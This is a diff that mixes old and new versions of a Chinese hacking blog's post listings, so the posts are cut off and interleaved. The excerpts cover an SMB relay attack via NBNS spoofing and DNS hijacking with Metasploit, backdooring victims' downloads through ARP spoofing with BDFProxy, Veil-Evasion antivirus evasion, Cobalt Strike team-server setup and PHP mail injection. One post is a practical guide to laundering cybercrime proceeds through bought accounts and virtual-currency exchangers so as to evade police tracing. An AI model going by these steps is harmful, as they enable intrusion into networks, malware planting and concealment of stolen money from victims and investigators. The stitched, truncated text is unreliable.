-        <p>首先，介绍一下<a href="http://ha.cker.in/tag/SMB中继攻击" target="_blank">SMB中继攻击</a>的运作原理</p>  <p><a href="http://img.cker.in/SMB_1566/clip_image001.jpg" rel="lightbox"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/SMB_1566/clip_image001_thumb.jpg" width="695" height="487" /></a></p>  <p> 假设左边的主机为A，右边的主机为B</p>  <p>A试图访问B的共享服务</p>  <p> 第一步 A对B说：骚年，请让我登陆</p>  <p> 第二步 B对A说：骚年，我给你一个challenge，请先把你的密码Hash和challenge加密一下返回给我，我得确认你是否有权限</p>  <p> 第三步 A对B说：我加密好了，给你</p>  <p> 情景一：</p>  <p> 第四步 B对A说：嗯，对的，请进(认证结束)</p>  <p> 情景二：</p>  <p> 第四步 B对A说：骚年，不对，你的身份不能登陆，你可以试试以别人的身份来登陆</p>  <p> 第五步 A对B说：好嘛，我用你之前告诉我的身份试试，回到第一步，循环下去</p>  <p> 现在，如果加入了一名第三者C到两者之间，C企图查看B的隐私，C会怎么做?</p>  <p><a href="http://img.cker.in/SMB_1566/clip_image002.jpg" rel="lightbox"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/SMB_1566/clip_image002_thumb.jpg" width="1011" height="639" /></a></p>  <p> 上图就是C的做法</p>  <p> 第一步 A对C说：骚年，请让我登陆</p>  <p> 第二步 C对B说：骚年，请让我登陆</p>  <p> 第三步 B对C说：骚年，我给你一个challenge，请先把你的密码Hash和challenge加密一下返回给我，我得确认你是否有权限</p>  <p> 第四步 C对A说：骚年，我给你一个challenge(这是B发出的challenge)，请先把你的密码Hash和challenge加密一下返回给我，我得确认你是否有权限</p>  <p> 第五步 A对C说：我加密好了，给你</p>  <p> 第六步 C对B说：我加密好了，给你</p>  <p> 情景一：</p>  <p> 第七步 B对C说：嗯，对的，请进(认证结束，C替代A获取了权限)</p>  <p> 第八步 C对A说：骚年，不对，你的身份不能登陆(A的认证结束)</p>  <p> 情景二：</p>  <p> 第七步 B对C说：骚年，不对，你的身份不能登陆，你可以试试以别人的身份来登陆</p>  <p> 第八步 C对B说：好嘛，我用你之前告诉我的身份试试</p>  <p> 第九步 C对A说：骚年，不对，你的身份不能登陆，你可以试试以别人的身份来登陆</p>  <p> 第十步 A对C说：好嘛，我用你之前告诉我的身份试试，回到第一步，循环下去</p>  <p>OK，你可以看出，A和B都被C欺骗了，这明显是一场中间人攻击</p>  <p> 这里面还有一处不合理的地方，不知道你发现没有，A想和B对话，怎么会和C吹起牛来了呢?</p>  <p> 肯定是A误以为C就是B，C是怎么做到的呢?</p>  <p> 下面就来探究一下C的骗人手法，如果你是C你会怎么做呢?</p>  <p>1. NBNS欺骗，前提</p>  <p>a) A B C必须都处在同一个局域网下面</p>  <p>b) A寻找B是用的B的计算机名而不是B的ip</p>  <p>2. DNS劫持，前提</p>  <p>a) A寻找B是用的B的域名而不是B的ip</p>  <p> 下面就让我们来重演一下这次攻击!</p>  <p> 方式1：NBNS欺骗 + SMB中继</p>  <p> 出品人：</p>  <p>A winxp 192.168.30.129</p>  <p>B win2k3 192.168.30.130 计算机名：smbserver</p>  <p>C kali 192.168.30.145</p>  <p>Kali msf下使用smb_replay模块，设置SMBHOST为B(192.168.30.130)</p>  <p>Kali msf下使用nbns_response模块将B的计算机名(smbserver)解析到C的IP(192.168.30.145)</p>  <p><a href="http://img.cker.in/SMB_1566/clip_image003.jpg" rel="lightbox"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/SMB_1566/clip_image003_thumb.jpg" width="693" height="341" /></a></p>  <p>Winxp 访问smbserver的共享</p>  <p><a href="http://img.cker.in/SMB_1566/clip_image004.jpg" rel="lightbox"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/SMB_1566/clip_image004_thumb.jpg" width="742" height="429" /></a></p>  <p>OK，到Kali下看看结果</p>  <p>Cool，我们成功拿到了B的Meterpreter shell</p>  <p> 原理：NBNS是广播的，所以C只需要赶在B之前告诉A：“C的计算机名是smbserver”就行了</p>  <p> 方式2：DNS劫持+SMB中继</p>  <p> 出品人：</p>  <p>A winxp 192.168.30.129</p>  <p>B win2k3 192.168.30.130 域名：share.baidu.com</p>  <p>C kali 192.168.30.145</p>  <p> 由于虚拟机有限，我将B模拟成一台内网中被黑掉的DNS服务器</p>  <p>Kali msf下使用smb_replay模块，设置SMBHOST为B(192.168.30.130)</p>  <p> 将DNS服务器的 share.baidu.com 域名指向C(192.168.30.145)</p>  <p><a href="http://img.cker.in/SMB_1566/clip_image005.jpg" rel="lightbox"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image005" border="0" alt="clip_image005" src="http://img.cker.in/SMB_1566/clip_image005_thumb.jpg" width="459" height="252" /></a></p>  <p>Winxp 访问share.baidu.com的共享</p>  <p><a href="http://img.cker.in/SMB_1566/clip_image006.jpg" rel="lightbox"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image006" border="0" alt="clip_image006" src="http://img.cker.in/SMB_1566/clip_image006_thumb.jpg" width="633" height="342" /></a></p>  <p>OK，到Kali下看看结果</p>  <p><a href="http://img.cker.in/SMB_1566/clip_image007.jpg" rel="lightbox"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image007" border="0" alt="clip_image007" src="http://img.cker.in/SMB_1566/clip_image007_thumb.jpg" width="867" height="370" /></a></p>  <p> 成功拿到B的shell</p>  <p> 如果你很注意细节，你应该会有一个问题，如果我们将NBNS欺骗和<a href="http://ha.cker.in/tag/DNS劫持" target="_blank">DNS劫持</a>同时启用，但指向不同的IP会有怎样的效果?</p>  <p> 我将告诉你：只有DNS劫持会起作用</p>  <p> 看下图就知道了</p><br>
-        
-          <p class="article-more-link">
-            <a href="/1086.seo/#more">Read More</a>
-          </p>
-        
+        <p>1. 简介</p>  <hr align="center" size="0" width="100%" noshade="noshade" />  <p>如今,互联网的使用急剧上升,但绝大多数互联网用户没有安全知识背景。大多数的人都会使用互联网通过邮件Email的方式和他人进行通信。出于这个原因,大多数网站允许他们的用户联系他们，向网站提供建议,报告一个问题,或者要求反馈,用户将会发送反馈给网站管理员的电子邮件。   <br />不幸的是,大多数web开发人员对安全编码Code-Security没有足够的认识,其中的一些程序猿使用现成的库或框架,这些库受到许多已知的漏洞。这些漏洞是已经公布,厂商并已经对其进行了修补，并且相应的攻击源代码poc都在互联网上可下载的,但大多数开发人员都懒得升级到最新版本。</p>  <p>今天我们要谈论电子邮件注射,攻击者可以使用你的邮件服务器来发送垃圾邮件。</p>  <p>2. 邮件注入</p>  <hr align="center" size="0" width="100%" noshade="noshade" />  <p>From Wikipedia:</p>  <p>电子<a href="http://ha.cker.in/tag/邮件注入" target="_blank">邮件注入</a>是一个安全漏洞,这种漏洞广泛存在于在互联网电子邮件收发应用中。这是电子邮件注射和HTTP头注射类似。和<a href="http://ha.cker.in/tag/SQL注入" target="_blank">SQL注入</a>攻击类似,这种漏洞是一类常见的的漏洞,发生在当一个编程语言是嵌入到另一个，例如MYSQL嵌入到PHP中。</p>  <p>当一个可以提交数据到一个Web应用程序表单被添加到一个Web页面,恶意用户可能会利用MIME格式添加额外的信息到要发送的消息中(POST/GET),比如一个新的收件人列表或一个完全不同的消息体。因为MIME格式使用回车分隔在数据包中信息(HTTP数据包中的每一行之间都有一个换行符,在POST和HTTP HEADER之间有两个换行符),通过添加回车提交表单数据(使用FB的一些插件可以很容易的做到),可以允许一个简单的留言板是用来发送成千上万的消息。同样,一个垃圾邮件发送者可以使用这种战术的恶意发送大量的匿名消息。</p>  <p>电子邮件注入是针对PHP内置邮件功能的一种攻击类型。它允许恶意攻击者注入任何邮件头字段,BCC、CC、主题等,它允许黑客通过注入手段从受害者的邮件服务器发送垃圾邮件。由于这个原因,这种攻击称为电子邮件注入,或者邮件形式滥发。这个漏洞是不限于PHP。它可能会影响任何从用户UI接收消息并发送电子邮件消息的应用程序。这种攻击的主要原因是不适当的用户输入验证或应用程序根本没有验证和过滤机制。</p>  <p>3. 邮件注入的攻击原理</p>  <hr align="center" size="0" width="100%" noshade="noshade" />  <p>中国古话说得好: 知其然才能知其所以然。   <br />为了解释邮件注入的工作原理，我们必须先了解PHP Email函数的工作原理。下面是从PHP Manual中找到API解释</p>  <p>mail():</p>  <p><a href="http://www.php.net/manual/en/function.mail.php">http://www.php.net/manual/en/function.mail.php</a></p>  <p>bool mail ( string $to , string $subject , string $message [, string $additional_headers [, string $additional_parameters ]] )</p>  <p>你可以注意到,这需要三个必填参数(”目的地、主题和消息”)和其他一些可选参数和函数返回一个布尔值。</p>  <p>那么让我们来看看一个带漏洞的代码来演示这个漏洞:</p>  <p><a href="http://img.cker.in/PHP_138FF/clip_image002.jpg" rel="lightbox"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="PHP邮件注入攻击技术" border="0" alt="PHP邮件注入攻击技术" src="http://img.cker.in/PHP_138FF/clip_image002_thumb.jpg" width="694" height="141" /></a></p><br>
       
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://id.cker.in/1086.seo/" data-id="cirz4nzqz008boz7698j9dgv5" class="article-share-link">Share</a>
+      </p>
       
+      <p>
+          <a href="/1107.seo/" class="excerpt-link">Read More...</a>
+      </p>
       
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/DNS劫持/">DNS劫持</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/SMB中继攻击/">SMB中继攻击</a></li></ul>
-
-    </footer>
-  </div>
+    </section>
+  </article>
   
-</article>
-
-
-  
-    <article id="post-1085" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/1085.seo/" class="article-date">
-  <time datetime="2014-07-02T09:28:05.000Z" itemprop="datePublished">2014-07-02</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/category/黑客技巧/">黑客技巧</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2015-04-21T09:52:19.000Z" itemprop="datePublished">
+          2015-04-21
+      </time>
     
     
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/1085.seo/">论黑产黑阔如何安全地转移赃款 洗钱？</a>
-    </h1>
-  
-
-      </header>
+    | 
+    <a href='/tag/ettercap/'>ettercap</a>,
     
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>0x00 背景</p>  <p>相信曾经与<a href="http://ha.cker.in/tag/黑色产业" target="_blank">黑色产业</a>打过交道的同鞋们对这个话题并不陌生。赃款转移，是黑色产业链中最重要的一环，因为这一环直接与黑阔们的收入息息相关。赃款转移地太过安全，容易产生巨额手续费/汇率而导致收入减少。赃款转移不够安全，容易导致水表被查，也就是那句：有命赚钱没命花钱。</p>  <p>下面将会在此文章中谈谈我曾经见过的黑钱转移手段以及自己的分析。各位看官娱乐娱乐即可，请不要将黑产的魔掌伸向普通老百姓，也请各位黑产黑阔们在洗别人银行卡的时候分析下对方的家境，毕竟“盗亦有道”。</p>  <p>0x01 细节</p>  <p>下面我们来从经济方面分析（即不考虑网监对黑阔进行技术侦查或黑阔完全隐蔽了自己的身份）：</p>  <p>首先，我朝的黑阔收黑钱主要是两种渠道：支付宝以及银行黑卡</p>  <p>现在注册支付宝以及银行开户都要有本人的身份证，手机绑定等。既然有了身份证以及手机绑定，当局有实权部门即可轻易定位到有关人员，并上门查水表。所以黑产黑阔们首先要做的，就是买一个非自己身份开户的支付宝/银行卡</p>  <p>这些收款账户如何来呢？笔者尝试在谷歌上搜索“出售支付宝”并限定时间为2014-01-01 - 今天</p>  <p><a href="http://img.cker.in/0b8bd9bd897e_12F2/clip_image001.jpg" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/0b8bd9bd897e_12F2/clip_image001_thumb.jpg" width="756" height="485"></a></p>  <p>共有389,000 除去骗子至少应该还有几千家店铺在出售支付宝账户。很多<a href="http://ha.cker.in/tag/黑产" target="_blank">黑产</a>黑阔直接就去购买了，可这样就会留下一个安全隐患</p>  <p>大概流程图如下:</p>  <p><a href="http://img.cker.in/0b8bd9bd897e_12F2/clip_image002.jpg" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/0b8bd9bd897e_12F2/clip_image002_thumb.jpg" width="675" height="121"></a></p>  <p>当然如果警察这样追查的话也很容易就抓获黑阔（如果<a href="http://ha.cker.in/tag/黑阔" target="_blank">黑阔</a>在ip方面，后门软件方面，社交关系方面均无任何弱点）</p>  <p>这类售号商家一般都是真实ip 或者 直接就是到偏远地区收购身份证的方法。 警方只需对售号商家进行调查，即可通过转账记录查到黑阔，流程如下：</p>  <p><a href="http://img.cker.in/0b8bd9bd897e_12F2/clip_image003.jpg" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/0b8bd9bd897e_12F2/clip_image003_thumb.jpg" width="665" height="177"></a></p>  <p>所以在购买黑卡/黑支付宝的时候要经过一个特殊的步骤：将白钱洗为黑钱</p>  <p>首先需要注册一个虚拟货币平台账户，如<a href="http://ha.cker.in/tag/比特币" target="_blank">比特币</a>平台，Ripple，WebMoney，Perfect Money</p>  <p>然后通过境外的货币兑换网络将白钱兑换为黑钱</p>  <p><a href="http://img.cker.in/0b8bd9bd897e_12F2/clip_image004.jpg" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/0b8bd9bd897e_12F2/clip_image004_thumb.jpg" width="594" height="84"></a></p>  <p>在这样的条件下，只要货币兑换中心的服务器未被拿下，在货币兑换之后即属无人监管状态。如果仍然不放心，可以多次进行步骤重复，但是要注意汇率。</p>  <p>在购买支付宝的时候，直接将虚拟货币通过另一个兑换平台打到卖家卡中</p>  <p><a href="http://img.cker.in/0b8bd9bd897e_12F2/clip_image005.jpg" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image005" border="0" alt="clip_image005" src="http://img.cker.in/0b8bd9bd897e_12F2/clip_image005_thumb.jpg" width="560" height="64"></a></p>  <p>这样购买获得的黑支付宝帐号即属于无任何关联性，即使警方将黑卡商家带走调查，也完全无法查出黑产黑阔的真实身份</p>  <p>而目前，支付宝很大一部分都需要手机绑定，但是其支持海外手机号绑定：</p>  <p><a href="http://img.cker.in/0b8bd9bd897e_12F2/clip_image006.jpg" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image006" border="0" alt="clip_image006" src="http://img.cker.in/0b8bd9bd897e_12F2/clip_image006_thumb.jpg" width="698" height="177"></a></p>  <p>而海外手机号虚拟号多如牛毛，因此手机号绑定问题可以完全忽略不计。</p>  <p>如何将赃款/黑钱洗为白钱？</p>  <p>首先，将支付宝中的黑钱转换到兑换商（目前支持支付宝的兑换商很多，谷歌一下能出不少结果）</p>  <p>然后通过兑换商将黑钱转到虚拟货币平台中</p>  <p>再利用虚拟货币平台内部账户转移</p>  <p>通过另一个兑换商（可以为海外兑换商）走银行电汇或西联等方式转移到你的名下。</p>  <p>具体流程如下：</p>  <p><a href="http://img.cker.in/0b8bd9bd897e_12F2/clip_image007.jpg" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image007" border="0" alt="clip_image007" src="http://img.cker.in/0b8bd9bd897e_12F2/clip_image007_thumb.jpg" width="681" height="344"></a></p>  <p>这样的话，警方通过黑钱去向追查，也只能查到你在虚拟货币平台帐号为A的用户，无法追查到你在该平台B的账户，如果将黑钱分段转移，更能增加警方对侦破此类案件的难度。至此，白-&gt;黑，黑-&gt;白的流程就实现了。</p>  <p>但是，目前仍然有许多要解决的问题：</p>  <p>1.支付宝商家的可信度。</p>  <p>2.兑换商的汇率坑。</p>  <p>3.IP地址/后门软件/社会关系的身份隐蔽。</p>  <p>4.兑换商的信息安全是否到位</p>  <p>谢谢阅读！</p>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://id.cker.in/1085.seo/" data-id="cirz4nzqx0086oz769sytk87n" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/比特币/">比特币</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/黑产/">黑产</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/黑色产业/">黑色产业</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/黑阔/">黑阔</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-1084" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/1084.seo/" class="article-date">
-  <time datetime="2014-06-07T12:50:02.000Z" itemprop="datePublished">2014-06-07</time>
-</a>
+    <a href='/tag/kaili/'>kaili</a>,
     
-  <div class="article-category">
-    <a class="article-category-link" href="/category/原创文章/">原创文章</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
+    <a href='/tag/BDFProxy/'>BDFProxy</a>
     
     
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/1084.seo/">去掉VMWare检测hypervisor</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
+</span>
+      <h2 class="post-title"><a href="/1106.seo/">内网渗透之PC控制及完美过杀毒</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
       
-        <p>最近在 <a href="http://ha.cker.in/tag/Parallels Desktop" target="_blank">Parallels Desktop</a> 里装了个Win7,然后Win7里装<a href="http://ha.cker.in/tag/VMWare Workstation" target="_blank">VMWare Workstation</a> 8,出现错误：</p>  <p>You are running VMware Workstation through an incompatible hypervisor.&#160; You cannot power on a virtual machine until this hypervisor is disabled.</p>  <p><a href="http://img.cker.in/VMWarehypervisor_43C7/image.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="image" border="0" alt="image" src="http://img.cker.in/VMWarehypervisor_43C7/image_thumb.png" width="597" height="405"></a> </p>  <p>&#160;</p>  <p>解决方法如下：   <br>编辑 <a href="http://ha.cker.in/tag/Metasploitable" target="_blank">Metasploitable</a>.vmx 文件末尾添加：vmx.allowNested = TRUE</p>  <p>虚拟机可以正常启动。 </p>
+        <p>一、PC控制篇</p>  <p>在内网渗透的过程中,我们为了达到目标的长期控制,常会选择在目标PC上种植木马，此篇中主要讲述如何在目标下载exe及zip文件的时候在zip文件及exe程序当中插入我们的后门代码。这样，只要目标运行了下载的程序就能顺利将木马植入目标主机。</p>  <p>（一）用到的工具：</p>  <p>1.<a href="http://ha.cker.in/tag/kali" target="_blank">kali</a></p>  <p>2.<a href="http://ha.cker.in/tag/ettercap" target="_blank">ettercap</a></p>  <p>3.<a href="http://ha.cker.in/tag/BDFProxy" target="_blank">BDFProxy</a></p>  <p>4.msf</p>  <p>其中BDFProxy在kali里面默认没有安装，安装请参考：<a href="https://github.com/secretsquirrel/BDFProxy.git">https://github.com/secretsquirrel/BDFProxy.git</a></p>  <p>（二）实现步骤：</p>  <p>1.在成功安装好BDFProxy之后首先要进行一些配置，它的配置文件在/BDFProxy/bdfproxy.cfg，其中要注意修改以下两处：</p>  <p><a href="http://img.cker.in/PC_191B/clip_image001.png" rel="lightbox"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/PC_191B/clip_image001_thumb.png" width="329" height="219" /></a></p>  <p>图-1，BDFProxy默认监听的端口</p>  <p><a href="http://img.cker.in/PC_191B/clip_image002.png" rel="lightbox"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/PC_191B/clip_image002_thumb.png" width="426" height="293" /></a></p>  <p>图-2，后门代码反弹的主机及使用的playload</p>  <p>1. 以上配置好之后我们来启动BDFProxy。</p>  <p><a href="http://img.cker.in/PC_191B/clip_image004.jpg" rel="lightbox"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/PC_191B/clip_image004_thumb.jpg" width="580" height="281" /></a></p>  <p>图-3，启动BDFProxy </p>  <p>2.打开日志，方便我们时时查看执行情况。图-4</p>  <p><a href="http://img.cker.in/PC_191B/clip_image005.png" rel="lightbox"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image005" border="0" alt="clip_image005" src="http://img.cker.in/PC_191B/clip_image005_thumb.png" width="389" height="185" /></a></p>  <p>图-4，打开BDFProxy日志</p>  <p>3.启动msfconsole，注意这里我们用BDFProxy生成的配置文件来启动msfconsole。图-5</p>  <p><a href="http://img.cker.in/PC_191B/clip_image007.jpg" rel="lightbox"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image007" border="0" alt="clip_image007" src="http://img.cker.in/PC_191B/clip_image007_thumb.jpg" width="580" height="191" /></a></p>  <p>图-5，启动msfconsole</p>  <p>4.启动ettercap 来执行arp欺骗，具体的arp欺骗不在本篇的讨论范围,请自行查阅相关资料.</p><br>
       
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://id.cker.in/1084.seo/" data-id="cirz4nzqr007qoz76tlpjdpma" class="article-share-link">Share</a>
+      </p>
       
+      <p>
+          <a href="/1106.seo/" class="excerpt-link">Read More...</a>
+      </p>
       
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/Metasploitable/">Metasploitable</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/Parallels-Desktop/">Parallels Desktop</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/VMWare-Workstation/">VMWare Workstation</a></li></ul>
-
-    </footer>
-  </div>
+    </section>
+  </article>
   
-</article>
-
-
-  
-    <article id="post-1083" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/1083.seo/" class="article-date">
-  <time datetime="2014-05-25T03:24:31.000Z" itemprop="datePublished">2014-05-25</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/category/linux笔记/">linux笔记</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2015-03-05T01:55:01.000Z" itemprop="datePublished">
+          2015-03-05
+      </time>
     
     
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/1083.seo/">开启MySQL的sql语句记录</a>
-    </h1>
-  
-
-      </header>
+    | 
+    <a href='/tag/Kali/'>Kali</a>,
     
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>在开发的时候经常会想看一下<a href="http://ha.cker.in/tag/MySQL" target="_blank">MySQL</a>最终执行的sql或者想保存sql记录，所以我们可以启用MySQL的sql记录功能。 </p>  <p>开启方法：   <br>编辑<a href="http://ha.cker.in/tag/MySQL" target="_blank">MySQL</a>的my.cnf文件，在文件的[mysqld]节点最下面添加下面的文本： </p>  <p>log-output=FILE   <br>general-log=1    <br>general_log_file=mysql-general.log </p>  <p>最后重启一下MySQL服务就可以了，最后会 记录在mysql的data\mysql-general.log文件中。</p>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://id.cker.in/1083.seo/" data-id="cirz4nzqo007ioz76flw4e2qp" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/Mysql/">Mysql</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-1082" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/1082.seo/" class="article-date">
-  <time datetime="2014-05-14T05:40:40.000Z" itemprop="datePublished">2014-05-14</time>
-</a>
+    <a href='/tag/Veil/'>Veil</a>,
     
-  <div class="article-category">
-    <a class="article-category-link" href="/category/黑客技巧/">黑客技巧</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
+    <a href='/tag/Veil-Evasion/'>Veil-Evasion</a>
     
     
-      <header class="article-header">
-        
+</span>
+      <h2 class="post-title"><a href="/1105.seo/">Kali install Veil</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        <p><a href="mailto:root@macbook">root@macbook</a>:~# cd /usr/share/</p>  <p>root@macbook:/usr/share# git clone <a href="https://github.com/Veil-Framework/Veil-Evasion.git">https://github.com/Veil-Framework/Veil-Evasion.git</a></p>  <p>正克隆到 ‘Veil-Evasion’…</p>  <p>remote: Counting objects: 2197, done.</p>  <p>remote: Compressing objects: 100% (8/8), done.</p>  <p>remote: Total 2197 (delta 1), reused 0 (delta 0), pack-reused 2189</p>  <p>Receiving objects: 100% (2197/2197), 33.84 MiB | 769 KiB/s, done.</p>  <p>Resolving deltas: 100% (1153/1153), done.</p>  <p>root@macbook:/usr/share# cd Veil-Evasion/</p>  <p><a href="mailto:root@macbook:/usr/share#./setup/setup.py">root@macbook:/usr/share#./setup/setup.py</a> #运行后弹出如下对话框点OK</p>  <p><a href="http://img.cker.in/KaliinstallVeil_F930/clip_image001_3.png" rel="lightbox"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/KaliinstallVeil_F930/clip_image001_thumb.png" width="554" height="294" /></a></p>  <p>root@macbook:/usr/share/<a href="http://ha.cker.in/tag/Veil-Evasion" target="_blank">Veil-Evasion</a># ./Veil-Evasion.py </p>  <p>=========================================================================</p>  <p>Necessary install component missing</p>  <p>Re-running ./setup/setup.sh</p>  <p>=========================================================================</p>  <p>==========================================================================</p>  <p><a href="http://ha.cker.in/tag/Veil-Evasion" target="_blank">Veil-Evasion</a> Setup Script | [Updated]: 09.09.2014</p>  <p>==========================================================================</p>  <p>[Web]: <a href="https://www.veil-framework.com">https://www.veil-framework.com</a> | [Twitter]: @VeilFramework</p>  <p>==========================================================================</p>  <p>[WARNING]: Setup No Longer Requires Constant Root Privileges.</p>  <p>Continuing Will Install Veil Only For The Root User.</p>  <p>Continue With Installation? (y/n): y</p>  <p>Kali linux detected…</p>  <p>[<em>] Capstone Already Installed… Skipping.</p>  <p>[</em>] Wine Python Already Installed… Skipping.</p>  <p>[<em>] Initializing Apt Package Installation</p>  <p>[</em>] Installing Microsoft Fonts</p>  <p>正在读取软件包列表… 完成</p>  <p>正在分析软件包的依赖关系树</p>  <p>正在读取状态信息… 完成</p><br>
+      
+      </p>
+      
+      <p>
+          <a href="/1105.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/1082.seo/">Cobalt Strike 之团队服务器的搭建与DNS通讯演示</a>
-    </h1>
-  
-
-      </header>
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2015-01-30T14:59:12.000Z" itemprop="datePublished">
+          2015-01-30
+      </time>
     
-    <div class="article-entry" itemprop="articleBody">
+</span>
+      <h2 class="post-title"><a href="/1104.seo/">2014 新增热门软件排行榜 TOP 100(开源中国)</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
       
-        <p>0x00 背景</p>  <hr align="left" size="5" width="100%" noshade="noshade" />  <p><a href="http://ha.cker.in/tag/Cobalt Strike" target="_blank">Cobalt Strike</a> 一款以metasploit为基础的GUI的框框架式渗透工具，<a href="http://ha.cker.in/tag/Armitage" target="_blank">Armitage</a>的商业版，集成了端口发、服务扫描，自动化溢出，多模式端口监听，win exe木马生成，win dll木马生成，java木马生成，office宏病毒生成，木马捆绑，mac os 木马生成，钓鱼攻击包括：站点克隆，目标信息获取，java执行，游览器自动攻击等等。</p>  <p>Cobalt Strike 官网为 <a href="http://www.advancedpentest.com/">Cobalt Strike</a> 程序只不接受大天朝的下载，各位自行想办法。<a href="http://blog.strategiccyber.com/">作者博客</a> 有很多好东西，推荐大家收藏。</p>  <p>Cobalt Strike 在1.45和以前是可以连接本机windows的<a href="http://ha.cker.in/tag/metasploit" target="_blank">metasploit</a>的，在后来就不被支持了，必须要求连接远程linux的<a href="http://ha.cker.in/tag/metasploit" target="_blank">metasploit</a>。</p>  <p>Cobalt Strike 还有个强大的功能就是他的团体服务器功能，它能让多个攻击者同时连接到团体服务器上，共享攻击资源与目标信息和sessions。</p>  <p>这篇文章就给大家分享下我大家团体服务器的方法（我的不一定是最好的，参考下就行了）</p>  <p>0x01 搭建</p>  <hr align="left" size="5" width="100%" noshade="noshade" />  <p>1.服务器</p>  <p>服务器强烈建议大家选择ubuntu的，内存1G以上，带宽8M以上，虽然在Centos上也帮朋友成功搭建过，但是很不推荐，稳定性和维护性都没有用ubuntu好。</p>  <p>2.安装metasploit</p>  